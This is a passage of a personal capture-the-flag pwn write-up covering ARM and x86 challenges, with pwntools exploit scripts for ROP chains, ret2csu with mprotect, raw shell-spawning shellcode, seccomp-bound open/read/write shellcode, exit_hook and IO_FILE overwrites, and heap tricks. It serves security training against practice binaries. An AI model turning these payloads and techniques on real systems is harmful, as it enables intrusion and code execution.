<td>Intra-procedure Call Trampoline</td>
<td><strong>caller-saved</strong></td>
</tr>
<tr>
<td>R13</td>
<td>SP</td>
<td>Stack Pointer</td>
<td>8-byte aligned</td>
</tr>
<tr>
<td>R14</td>
<td>LR</td>
<td>Return Address</td>
<td><strong>caller-saved</strong></td>
</tr>
<tr>
<td>R15</td>
<td>PC</td>
<td>Program Counter</td>
<td>Read/Branch</td>
</tr>
<tr>
<td>CPSR/APSR</td>
<td>Flags</td>
<td>Condition Codes</td>
<td>Updated by instructions</td>
</tr>
<tr>
<td>S0â€“S31 / D0â€“D31 / Q0â€“Q15</td>
<td>VFP/NEON</td>
<td>Floating-point/Vector</td>
<td>Saved per toolchain convention (commonly D8â€“D15 callee-saved)</td>
</tr>
</tbody>
</table>
<p>Required Software:</p>
<pre><code class="language-sh">sudo apt-get install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu gdb-multiarch
</code></pre>
<p>Debugging:</p>
<pre><code class="language-sh">qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./pwn
pwndbg&gt; target remote localhost:1234
</code></pre>
<p><strong>Note: 32-bit ARM also uses registers for argument passing</strong>, <code>r0</code> is the first argument, <code>r1</code> is the second, and so on.</p>
<p>exp(debuggable):</p>
<pre><code class="language-python">from pwn import *
elf_path = '/home/junyu33/Desktop/tmp/typo'
#libc_path = '/home/junyu33/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6'
#libc_path = './libc/libc.so_2.6'

def exploit():
   bin_sh = 0x6c384
   system = 0x110b4
   pop_r0_r4_pc = 0x20904

   payload = b'a'*112 + p32(pop_r0_r4_pc)+ p32(bin_sh) + p32(0) + p32(system)
   io.sendline()
   io.send(payload)

if __name__ == '__main__':
   context(arch='arm', os='linux', log_level='debug')
   io = process(['qemu-arm', '-g', '1234', elf_path])
   elf = ELF(elf_path)
   #libc = ELF(libc_path)

   if(sys.argv.__len__() &gt; 1):
      if sys.argv[1] == 'debug':
         gdb.attach(io, 'target remote localhost:1234')
      elif sys.argv[1] == 'remote':
         io = remote('node4.buuoj.cn', 29593)


   exploit()
   io.interactive()
   io.close()
</code></pre>
<h2 id="shanghai2018-baby-armâ€”â€”arm-ret2csu-vmprotect">shanghai2018_baby_armâ€”â€”arm ret2csu+vmprotect</h2>
<p>Introduction to aarch64 registers:</p>
<table>
<thead>
<tr>
<th>Register</th>
<th>Alias/Description</th>
<th>Typical Usage</th>
<th>ABI Convention (AAPCS64)</th>
</tr>
</thead>
<tbody>
<tr>
<td>X0â€“X7 / W0â€“W7</td>
<td>Lower 32 bits use Wn</td>
<td>Function args/ret</td>
<td>First 8 args; return value X0 (X1 assists if needed) <strong>caller-saved</strong></td>
</tr>
<tr>
<td>X8</td>
<td>indirect result / syscall num</td>
<td>Platform reserved</td>
<td><strong>caller-saved</strong></td>
</tr>
<tr>
<td>X9â€“X15</td>
<td>Temporary</td>
<td>Volatile</td>
<td><strong>caller-saved</strong></td>
</tr>
<tr>
<td>X16â€“X17</td>
<td>IP0/IP1</td>
<td>Internal jump/PLT bridge</td>
<td><strong>caller-saved</strong></td>
</tr>
<tr>
<td>X18</td>
<td>Platform register</td>
<td>Some use as TLS/reserved</td>
<td>Platform-dependent; usually avoid</td>
</tr>
<tr>
<td>X19â€“X28</td>
<td>Saved registers</td>
<td>Callee preserved</td>
<td><strong>callee-saved</strong></td>
</tr>
<tr>
<td>X29</td>
<td>FP</td>
<td>Frame pointer</td>
<td><strong>callee-saved</strong></td>
</tr>
<tr>
<td>X30</td>
<td>LR</td>
<td>Return address</td>
<td><strong>caller-saved</strong> (overwritten by call)</td>
</tr>
<tr>
<td>SP</td>
<td>Stack pointer</td>
<td>16-byte aligned</td>
<td>Aligned before/after call</td>
</tr>
<tr>
<td>PC</td>
<td>Program counter</td>
<td>Next instruction</td>
<td>Read-only access</td>
</tr>
<tr>
<td>XZR/WZR</td>
<td>Constant 0</td>
<td>Write discard</td>
<td>Not general storage</td>
</tr>
<tr>
<td>V0â€“V31</td>
<td>128-bit SIMD/FP</td>
<td>NEON/FP compute</td>
<td>V8â€“V15 <strong>callee-saved</strong>; others <strong>caller-saved</strong></td>
</tr>
<tr>
<td>PSTATE/NZCV</td>
<td>Flags</td>
<td>Conditional branch</td>
<td>Updated by instructions</td>
</tr>
</tbody>
</table>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hac425/p/9905475.html">https://www.cnblogs.com/hac425/p/9905475.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/118518498">https://blog.csdn.net/qq_41202237/article/details/118518498</a></p>
</blockquote>
<p>The first parameter of <code>vmprotect</code> is addr, the second is length, and the third is permission, as follows:</p>
<pre><code class="language-c">#define PROT_READ	0x1     /* Page can be read.  */
#define PROT_WRITE	0x2     /* Page can be written.  */
#define PROT_EXEC	0x4     /* Page can be executed.  */
#define PROT_NONE	0x0     /* Page can not be accessed.  */
</code></pre>
<p>aarch64 also has an <code>init</code> function similar to <code>libc_csu_init</code>, shown here is the latter part:</p>
<pre><code class="language-asm">.text:00000000004008AC                               loc_4008AC                    ; CODE XREF: init+60â†“j
.text:00000000004008AC A3 7A 73 F8                   LDR             X3, [X21,X19,LSL#3] ;mov X3, [X21+X19+LSL&lt;&lt;3]
.text:00000000004008B0 E2 03 16 AA                   MOV             X2, X22 ;argument 2
.text:00000000004008B4 E1 03 17 AA                   MOV             X1, X23 ;argument 1
.text:00000000004008B8 E0 03 18 2A                   MOV             W0, W24 ;argument 0
.text:00000000004008BC 73 06 00 91                   ADD             X19, X19, #1
.text:00000000004008C0 60 00 3F D6                   BLR             X3 ;jmp X3
.text:00000000004008C0
.text:00000000004008C4 7F 02 14 EB                   CMP             X19, X20
.text:00000000004008C8 21 FF FF 54                   B.NE            loc_4008AC
.text:00000000004008C8
.text:00000000004008CC
.text:00000000004008CC                               loc_4008CC                    ; CODE XREF: init+3Câ†‘j
.text:00000000004008CC F3 53 41 A9                   LDP             X19, X20, [SP,#var_s10] ;x19 = [sp+0x10], x20 = [sp+0x18]
.text:00000000004008D0 F5 5B 42 A9                   LDP             X21, X22, [SP,#var_s20]
.text:00000000004008D4 F7 63 43 A9                   LDP             X23, X24, [SP,#var_s30]
.text:00000000004008D8 FD 7B C4 A8                   LDP             X29, X30, [SP+var_s0],#0x40 ;x29 = [sp], x30 = [sp+9], sp+=0x40
.text:00000000004008DC C0 03 5F D6                   RET
</code></pre>
<p>exp:</p>
<pre><code class="language-python">def exploit():
   offset = 72
   mprotect = 0x4007e0
   buf = 0x411068
   shellcode = asm(shellcraft.aarch64.sh())

   payload = p64(mprotect) + shellcode
   io.send(payload)

   payload = b'a'*72 + p64(0x4008cc) # ret2csu

   payload += p64(0) + p64(0x4008ac) # x29, x30
   payload += p64(0) + p64(1) # x19, x20
   payload += p64(buf) + p64(7) # x21, x22
   payload += p64(0x1000) + p64(buf) # x23, x24
   payload += p64(0) + p64(buf+8) # x29', x30' (new frame)

   io.sendline(payload)   
</code></pre>
<h2 id="inctf2018-wARMup-â€”-ARM-Shellcode">inctf2018_wARMup â€” ARM Shellcode</h2>
<p>Note that in ARM architecture, the .bss section is executable, allowing direct placement of shellcode on the bss segment.</p>
<p>Originally intended to use shellcraft, but it failed. Ended up grabbing a piece of shellcode from the internet which worked, though it didn't pass locally.</p>
<p><code>b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78'</code></p>
<pre><code class="language-python">from pwn import *
elf_path = '/home/junyu33/Desktop/tmp/wARMup'
#libc_path = '/home/junyu33/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6'
libc_path = '/usr/arm-linux-gnueabihf/lib/libc.so.6'

def exploit():
   shellcode = b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78'
   pop_r3_pc = 0x10364
   bss = 0x21034

   payload = b'a'*0x64 + p32(bss+0x68) + p32(pop_r3_pc) + p32(bss) + p32(0x10530)
   io.send(payload)
   payload = shellcode.ljust(0x68, b'\0') + p32(bss) + p32(bss)
   io.send(payload)

if __name__ == '__main__':
   context(arch='arm', os='linux', log_level='debug')
   elf = ELF(elf_path)
   libc = ELF(libc_path)

   if(sys.argv.__len__() &gt; 1):
      if sys.argv[1] == 'debug':
         io = process(['qemu-arm', '-g', '1234', '-L', '/usr/arm-linux-gnueabihf', elf_path])
         gdb.attach(io, 'target remote localhost:1234')
      elif sys.argv[1] == 'remote':
         io = remote('node4.buuoj.cn', 25121)
   else:
      io = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabihf', elf_path])

   exploit()
   io.interactive()
   io.close()
</code></pre>
<h1>misc</h1>
<h2 id="cicsn-2019-ne-5â€”â€”sh">cicsn_2019_ne_5â€”â€”sh</h2>
<p>Both <code>sh</code> and <code>/bin/sh</code> can be used to open a shell.</p>
<pre><code class="language-bash">ROPgadget --binary pwn --string 'sh'
</code></pre>
<p>Payload structure:</p>
<pre><code class="language-python">b'a'*(0x48+4) + p32(sys_addr) + p32(main_addr) + p32(bin_sh)
</code></pre>
<h2 id="jarvisoj-level3â€”â€”find-bin-sh-using-pyscript">jarvisoj_level3â€”â€”find /bin/sh using pyscript</h2>
<pre><code class="language-python">def exploit():
   #libc = ELF('./libc/libc-2.30.so')
   libc = ELF('./libc/libc-2.23.so')

   elf = ELF('./level3')
   write_plt = elf.plt['write']
   write_got = elf.got['write']
   read_got = elf.got['read']
   vuln = elf.sym['vulnerable_function']

   io.recvuntil('Input:\n')
   payload1 = b'a'*140 + p32(write_plt) + p32(vuln) + p32(1) + p32(read_got) + p32(4)
   io.send(payload1)

   read_addr = u32(io.recv(4))
   libc_base = read_addr - libc.sym['read']
   log.success('libc_base'+hex(libc_base))
   bin_sh = libc_base + next(libc.search(b'/bin/sh')) # libc.search('/bin/sh').next() is out of date
   sys = libc_base + libc.sym['system']

   payload2 = b'a'*140 + p32(sys) + p32(vuln) + p32(bin_sh)
   io.send(payload2)
</code></pre>
<h2 id="ez-pz-hackover-2016-cyclic-find-offset">ez_pz_hackover_2016 - cyclic find offset</h2>
<p>Because sometimes IDA's analysis can also be wrong.</p>
<p><code>cyclic 50</code> generates a string sequence of length 50.</p>
<p>When a <code>segmentation fault</code> occurs during dynamic debugging with <code>gdb-peda</code>, you can determine the offset from the input position to <code>ebp</code> by extracting the string corresponding to <code>ebp</code>.</p>
<p><code>cyclic -l 'xxxx'</code> gives a result, and adding 4 or 8 to it yields the required padding size.</p>
<h2 id="pwnable-orw">pwnable_orw</h2>
<blockquote>
<p>ORW refers to the scenario where your system calls are restricted, preventing you from gaining privileges or the flag via child processes. Instead, you must obtain the flag within the same process using only <code>open</code>, <code>read</code>, and <code>write</code>.</p>
<p>seccomp, short for secure computing, is a straightforward sandboxing mechanism introduced in Linux kernel version 2.6.23. In Linux systems, a large number of system calls are directly exposed to user-space programs. However, not all system calls are necessary, and insecure code abusing system calls can pose security threats to the system. The seccomp security mechanism allows a process to enter a &quot;secure&quot; execution mode, where it can only invoke four system calls: <code>read()</code>, <code>write()</code>, <code>exit()</code>, and <code>sigreturn()</code>. Any other system call results in process termination.
â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”
Copyright Notice: This article is an original piece by the CSDN blogger &quot;åŠå²›é“ç›’@&quot;, following the CC 4.0 BY-SA copyright license. Reprinted with a link to the original source.
Original link: <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45556441/article/details/117852436">https://blog.csdn.net/weixin_45556441/article/details/117852436</a></p>
</blockquote>
<pre><code class="language-c">prctl(38, 1, 0, 0, 0); // elevation is forbidden
prctl(22, 2, &amp;v1); // only open() read() write() is allowed
</code></pre>
<p>You can also directly inspect using seccomp-tools:</p>
<pre><code class="language-sh">$ seccomp-tools dump ./asm
Welcome to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :)
give me your x64 shellcode: 1233
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010
 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010
 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
</code></pre>
<p>exp:</p>
<pre><code class="language-python"># https://blog.csdn.net/weixin_45556441/article/details/117852436
from pwn import *
context.arch = 'i386'
p = remote('node3.buuoj.cn',28626)
shellcode = shellcraft.open('/flag')
shellcode += shellcraft.read('eax','esp',100)
shellcode += shellcraft.write(1,'esp',100)
payload = asm(shellcode)
p.send(payload)
p.interactive()
</code></pre>
<p>or with asm code:</p>
<pre><code class="language-python"># https://blog.csdn.net/weixin_45556441/article/details/117852436
from pwn import *
from LibcSearcher import *

context(os = &quot;linux&quot;, arch = &quot;i386&quot;, log_level= &quot;debug&quot;)
p = remote(&quot;node3.buuoj.cn&quot;, 27008)

shellcode = asm('push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80')
shellcode+=asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80')
shellcode+=asm('mov eax,0x4;mov ebx,0x1;int 0x80')
p.sendlineafter('shellcode:', shellcode)

p.interactive()
</code></pre>
<h2 id="ZJCTF-2019-Login">[ZJCTF 2019]Login</h2>
<blockquote>
<p>Tip: Press Tab in the pseudocode view to switch to assembly code.</p>
</blockquote>
<p>This is actually a C++ reverse engineering challenge, which appears a bit tricky. The segmentation fault occurs due to the execution of <code>call rax</code>.</p>
<pre><code class="language-assembly">lea     rdx, [rbp+s]
lea     rax, [rbp+s]
mov     rcx, rdx
mov     edx, offset format ; &quot;Password accepted: %s\n&quot;
mov     esi, 50h ; 'P'  ; maxlen
mov     rdi, rax        ; s
mov     eax, 0
call    _snprintf
lea     rax, [rbp+s]
mov     rdi, rax        ; s
call    _puts
mov     rax, [rbp+var_68]
mov     rax, [rax]
mov     rax, [rax]
call    rax
jmp     short loc_400A62
</code></pre>
<p>Here, <code>[rbp+var_68]</code> is the first parameter of the function.</p>
<pre><code class="language-assembly">; unsigned __int64 __fastcall password_checker(void (*)(void))::&#123;lambda(char const*,char const*)#1&#125;::operator()(void (***)(void), const char *, const char *)
_ZZ16password_checkerPFvvEENKUlPKcS2_E_clES2_S2_ proc near

; __unwind &#123;
push    rbp
mov     rbp, rsp
add     rsp, 0FFFFFFFFFFFFFF80h
mov     [rbp+var_68], rdi ; HERE!!!
mov     [rbp+s1], rsi
mov     [rbp+s2], rdx
mov     rax, fs:28h
mov     [rbp+var_8], rax
xor     eax, eax
mov     rdx, [rbp+s2]
mov     rax, [rbp+s1]
mov     rsi, rdx        ; s2
mov     rdi, rax        ; s1
call    _strcmp
test    eax, eax
jnz     short loc_400A58
</code></pre>
<p>Returning to the <code>main</code> function, we can see that the return value of <code>_Z16password_checkerPFvvE</code> is passed to <code>[rbp+var_130]</code>, which ultimately becomes the first parameter of <code>_ZZ16password_checkerPFvvEENKUlPKcS2_E_clES2_S2_</code>, the previous function.</p>
<pre><code class="language-assembly">lea     rax, [rbp+var_131]
mov     rdi, rax
call    _ZZ4mainENKUlvE_cvPFvvEEv ; main::&#123;lambda(void)#1&#125;::operator void (*)(void)(void)
mov     rdi, rax        ; void (*)(void)
call    _Z16password_checkerPFvvE ; password_checker(void (*)(void)) ; HERE!!!
mov     [rbp+var_130], rax
mov     edi, offset login ; this
call    _ZN4User13read_passwordEv ; User::read_password(void)
lea     rax, [rbp+var_120]
mov     rdi, rax        ; this
call    _ZN4User12get_passwordEv ; User::get_password(void)
mov     rbx, rax
mov     edi, offset login ; this
call    _ZN4User12get_passwordEv ; User::get_password(void)
mov     rcx, rax
lea     rax, [rbp+var_130]
mov     rdx, rbx
mov     rsi, rcx
mov     rdi, rax
call    _ZZ16password_checkerPFvvEENKUlPKcS2_E_clES2_S2_ ; password_checker(void (*)(void))::&#123;lambda(char const*,char const*)#1&#125;::operator()(char const*,char const*)
mov     eax, 0
</code></pre>
<p>Now, let's examine <code>_Z16password_checkerPFvvE</code>:</p>
<pre><code class="language-assembly">; __int64 __fastcall password_checker(void (*)(void))
public _Z16password_checkerPFvvE
_Z16password_checkerPFvvE proc near

var_18= qword ptr -18h
var_8= qword ptr -8

; __unwind &#123;
push    rbp
mov     rbp, rsp
mov     [rbp+var_18], rdi
mov     [rbp+var_8], 0
lea     rax, [rbp+var_18]
pop     rbp
retn
; &#125; // starts at 400A79
_Z16password_checkerPFvvE endp

</code></pre>
<p>We can see that the return value is <code>[rbp+var_18]</code>.</p>
<p>Since these functions are all at the same level as subfunctions of <code>main</code>, the relative positions on the stack remain unchanged. Therefore, it is possible to overwrite <code>[rbp+var_18]</code> with the address of a shell during password input, thereby gaining shell access.</p>
<h2 id="wustctf2020-closed">wustctf2020_closed</h2>
<p>close(1) closes standard output, and close(2) closes standard error. We are left with only standard input, and we see that the program returns a shell (0 is standard input, 1 is standard output, 2 is standard error).</p>
<p>Redirect standard output to standard input to obtain the flag.</p>
<p><code>exec 1&gt;&amp;0</code></p>
<h2 id="mrctf2020-shellcode-revenge-Alphanumeric-Shellcode">mrctf2020_shellcode_revenge - Alphanumeric Shellcode</h2>
<p>You can use alpha3 to generate or import the AE64 library.</p>
<p>Reference link: <a target="_blank" rel="noopener" href="http://taqini.space/2020/03/31/alpha-shellcode-gen/#%E7%94%9F%E6%88%90shellcode">http://taqini.space/2020/03/31/alpha-shellcode-gen/#ç”Ÿæˆshellcode</a></p>
<pre><code class="language-python">def exploit():
   shellcode = asm(shellcraft.sh())
   alpha_shellcode = AE64().encode(shellcode)
   io.send(alpha_shellcode)
</code></pre>
<h2 id="hctf2018-the-endâ€”io-file-attack">hctf2018_the_endâ€”io_file attack</h2>
<p>Initially, I planned to forge a vtable locally in libc 2.23, replacing <code>setbuf</code> with a <code>one_gadget</code> to get a shell. GDB debugging showed that the shell was indeed obtained, but there was no output at all.</p>
<pre><code class="language-python">def exploit():
   io.recvuntil('gift ')
   libc_base = int(io.recv(14), 16) - libc.sym['sleep']
   print(hex(libc_base))
   one_gadget = libc_base + 0xf03a4 # 0x4527a 0xf03a4 0xf1247 0x45226

   stdout = libc_base + libc.symbols[&quot;_IO_2_1_stdout_&quot;]
   vtable = stdout + 0xd8
   fake_vtable = stdout + 0x48
   fake_setbuf = stdout + 0xa0
   print(hex(stdout), hex(vtable), hex(fake_vtable), hex(fake_setbuf), hex(one_gadget))

   for i in range(2):
      io.send(p64(vtable+i))
      io.send(p64(fake_vtable)[i:i+1])

   for i in range(3):
      io.send(p64(fake_setbuf+i))
      io.send(p64(one_gadget)[i:i+1])

   io.sendline(&quot;cat flag&gt;&amp;0&quot;) # failed
</code></pre>
<p>Then I referred to a senior's article: <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-262459.htm">https://bbs.pediy.com/thread-262459.htm</a>, which suggested modifying the function pointer <code>dl_rtld_lock_recursive</code> in <code>_rtld_global</code> to achieve an <code>exit_hook attack</code>.</p>
<p>Surprisingly, this method worked on the remote server (libc 2.27) but still failed locally on libc 2.23.</p>
<img src = 'https://img.junyu33.me/blog/bin_ctf/730251_VSKG4X24337JH42.jpg'>
<pre><code class="language-python">def exploit():
   io.recvuntil('gift ')
   libc_base = int(io.recv(14), 16) - libc.sym['sleep']
   print(hex(libc_base))
   one_gadget = libc_base + 0x4f322 # 0x4f2c5 0x4f322 0x10a38c

   _rtld_global = libc_base + 0x619060 # debug
   dl_rtld_lock_recursive_addr = _rtld_global + 0xf08

   for i in range(5):
      io.send(p64(dl_rtld_lock_recursive_addr + i))
      io.send(p64(one_gadget)[i:i+1])

   io.sendline(&quot;cat flag &gt;&amp;0&quot;)
</code></pre>
<p>There is another method I haven't tried: <a target="_blank" rel="noopener" href="https://blog.csdn.net/Mira_Hu/article/details/103736917">https://blog.csdn.net/Mira_Hu/article/details/103736917</a></p>
<blockquote>
<ul>
<li>
<p>Modify the last byte of <code>_IO_write_ptr</code> in <code>stdout</code> to achieve <code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>.</p>
</li>
<li>
<p>Modify the second-to-last byte of the vtable in <code>stdout</code> to ensure the forged <code>_IO_OVERFLOW</code> points to a libc-related address.</p>
</li>
<li>
<p>Finally, modify the last three bytes of the forged <code>_IO_OVERFLOW</code> to the one gadget.</p>
</li>
<li>
<p>After these five-byte modifications, executing the <code>exit</code> function will eventually execute the one gadget, obtaining a shell.</p>
</li>
</ul>
</blockquote>
<h2 id="ciscn-2019-n-7â€”exit-hook-Attack">ciscn_2019_n_7â€”exit_hook Attack</h2>
<p>Offsets of <code>exit_hook</code> in libc 2.23 and 2.27</p>
<blockquote>
<p>Update on 2022/10/17:</p>
<p>This should be <code>_rtld_global</code></p>
</blockquote>
<pre><code class="language-python"># libc-2.23.so
exit_hook = libc_base + 0x5f0040 + 3848
exit_hook = libc_base + 0x5f0040 + 3856

# libc-2.27.so
exit_hook = libc_base + 0x619060 + 3840
exit_hook = libc_base + 0x619060 + 3848
</code></pre>
<p>The program crashes locally, but the exploit is simple and can be executed remotely without debugging.</p>
<pre><code class="language-python">def exploit():
   io.sendline('666')
   io.recvuntil('0x')
   libc_base = int(io.recv(12), 16) - libc.sym['puts']
   log.info('libc_base: ' + hex(libc_base))
   exit_hook = 0x5f0040 + 3848
   one_gadget = 0xf1147

   add(0x18, 'a')
   edit(b'a'*8 + p64(libc_base + exit_hook), p64(libc_base + one_gadget))
   io.sendline('4')
   # exec 1&gt;&amp;0 cat flag
</code></pre>
<h2 id="wdb2018-GUESSâ€”fork-libc-to-stack">wdb2018_GUESSâ€”fork+libc to stack</h2>
<p>This program uses the <code>fork</code> function, which copies the entire memory of the original process to the child process (including the execution flow), so the stack addresses and libc addresses remain unchanged.</p>
<p>When the program modifies the canary, it will report an error and exit, printing the program's path. We can modify the address corresponding to this path (1) to achieve certain goals, as detailed below:</p>
<ul>
<li>Change (1) to <code>puts.got</code> to leak the libc address and obtain the address of <code>libc.environ</code>.</li>
<li>Then change (1) to <code>libc.environ</code> to leak a certain stack address (2).</li>
<li>Since the flag is on the stack, we can calculate the offset to the flag address and change the address in (1) to that address to leak the flag.</li>
</ul>
<p>Both (1) and (2) can be determined through debugging.</p>
<pre><code class="language-python">def exploit():
   payload = b'a'*0x128 + p64(elf.got['puts'])
   io.sendline(payload)
   libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['puts']
   log.success(message='libc_base: ' + hex(libc_base))
   libc_environ = libc_base + libc.sym['environ']
   
   payload = b'a'*0x128 + p64(libc_environ)
   io.sendline(payload)
   stack_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
   log.success(message='stack_addr: ' + hex(stack_addr))
   flag_addr = stack_addr - 0x7ffd64929cc8 + 0x7ffd64929b60

   payload = b'a'*0x128 + p64(flag_addr)
   io.sendline(payload)
</code></pre>
<h2 id="ciscn-2019-final-2â€”Modify-File-Descriptor">ciscn_2019_final_2â€”Modify File Descriptor</h2>
<p>This challenge has no sandbox restrictions, so using ORW is not necessary.</p>
<pre><code class="language-sh"># junyu33 @ zjy in ~/tmp [11:21:25]
$ seccomp-tools dump ./ciscn_final_2
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007
 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00000000  return KILL
</code></pre>
<p>At the beginning, there is an operation that modifies the file descriptor for the flag:</p>
<pre><code class="language-c">unsigned __int64 init()
&#123;
  int fd; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  fd = open(&quot;flag&quot;, 0);
  if ( fd == -1 )
  &#123;
    puts(&quot;no such file :flag&quot;);
    exit(-1);
  &#125;
  dup2(fd, 666);
  close(fd);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  alarm(0x3Cu);
  return __readfsqword(0x28u) ^ v2;
&#125;
</code></pre>
<p>We only need to change the file descriptor to <code>666</code>.</p>
<p>Specifically, modify the <code>_fileno</code> field in the <code>FILE</code> structure (refer to <code>house of orange</code>) to <code>666</code>.</p>
<pre><code class="language-python">def exploit():
   add(1, 0x30)
   dele(1)
   for i in range(4):
      add(2, 0x20)
   dele(2)
   add(1, 0x1234) # bool
   dele(2)
   show(2)
   
   io.recvuntil('number :')
   heap_low = (int(io.recvline()[:-1]) + 0x10000) &amp; 0xffff
   log.success('heap_low: '+hex(heap_low))
   add(2, heap_low - 0xa0)
   add(2, 0)
   
   dele(1)
   add(2, 0x91)
   for i in range(7):
      dele(1)
      add(2, 0) # bool
   dele(1)
   show(1)

   io.recvuntil('number :')
   libc_low = (int(io.recvline()[:-1]) - libc.sym['__malloc_hook'] - 0x70 + 0x100000000) &amp; 0xffffffff
   log.success('libc_low: '+hex(libc_low))
   stdin = libc_low + libc.sym['_IO_2_1_stdin_'] + 0x70 # here

   add(2, stdin&amp;0xffff) # no tcache
   add(1, 0)
   add(1, 666)
   leave('ok')
</code></pre>
<h2 id="actf-2019-babyheapâ€”â€”avoid-forking-child-process">actf_2019_babyheapâ€”â€”avoid forking child process</h2>
<pre><code class="language-python">gdb.attach(io, 'set follow-fork-mode parent')
</code></pre>
<h2 id="hfctf-2020-marksmanâ€”exit-hook-attack2">hfctf_2020_marksmanâ€”exit_hook attack2</h2>
<blockquote>
<p>Reference link: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/14687617.html">https://www.cnblogs.com/LynneHuan/p/14687617.html</a></p>
</blockquote>
<p>Another form of <code>exit_hook</code> attack, modifying <code>_dl_catch_error@got.plt</code> to <code>one_gadget</code></p>
<p>Use the <code>-l</code> parameter with <code>one_gadget</code>, such as <code>-l2</code>, <code>-l3</code>, to view more gadgets</p>
<pre><code class="language-python">def exploit():
   io.recvuntil('0x')
   libc_puts = int(io.recv(12), 16)
   libc_base = libc_puts - libc.symbols['puts']
   ogg = [0x4f2c5, 0x4f322, 0xe569f, 0xe5858, 0xe585f, 0xe5863, 0x10a387, 0x10a398]
   one_gadget = libc_base + ogg[2]
   exit_hook = libc_base + 0x5f4038 # _dl_catch_error@got.plt

   io.sendline(str(exit_hook))
   io.sendline(p8(one_gadget&amp;0xff))
   io.sendline(p8((one_gadget&gt;&gt;8)&amp;0xff))
   io.sendline(p8((one_gadget&gt;&gt;16)&amp;0xff))
</code></pre>
<h2 id="OGeek2019-Final-OVMâ€”â€”vm">[OGeek2019 Final]OVMâ€”â€”vm</h2>
<p>The difference between vm pwn and vm reverse is that you don't need to reverse all instructionsâ€”just focus on the vulnerable ones (primarily array out-of-bounds) and reverse other relevant instructions centered around exploiting that vulnerability. There's no need to write Python functions for every opcode, which wastes time.</p>
<p>In this challenge, opcode 0x30 and opcode 0x40 have array out-of-bounds vulnerabilities, allowing arbitrary read and write operations. Since the comment is allocated on the heap, a simple approach is to obtain the libc address via stderr, then modify the heap pointer to <code>__free_hook</code> and write a <code>one_gadget</code> into it.</p>
<pre><code class="language-python"># reg13 = sp
# reg15 = pc
# 0x10 dest = src0
# 0x30 dest = *src0 
# 0x40 *src0 = dest
# 0x80 dest = src1 - src0
# 0xa0 dest = src1 | src0
# 0xc0 dest = src1 &lt;&lt; src0
# 0xff print reg
# opcodes dest src1 src0

code = [
   # leak libc, offset to stderr = -26 
   
   0x100e0008, # r14 = 0x8
   0x1003001a, # r3 = 0x1a
   0x1004001b, # r4 = 0x19

   0x80030703, # r3 = -r3
   0x300c0003, # r12 = mem[r3] # lower addr of stderr

   0x80040704, # r5 = -r5
   0x300b0004, # r11 = mem[r4] # higher addr of stderr
   # write __free_hook to comment, offset = 0x10a8

   0x10030008, # r3 = 0x8
   0x80030703, # r3 = -r3

   0x10050010, # r5 = 0x10
   0x100600a8, # r6 = 0xa8
   0xc005050e, # r5 = r5 &lt;&lt; r14
   0xa0050506, # r5 = r5 | r6, so r5 = 0x10a8

   0x80050705, # r5 = -r5
   0x800c0c05, # r12 = 12 - (-r5), so r12 = __free_hook
   
   0x400c0003, # mem[r3] = r12
   0x10030007, # r3 = 0x7
   0x80030703, # r3 = -r3
   0x400b0003, # mem[r3] = r11

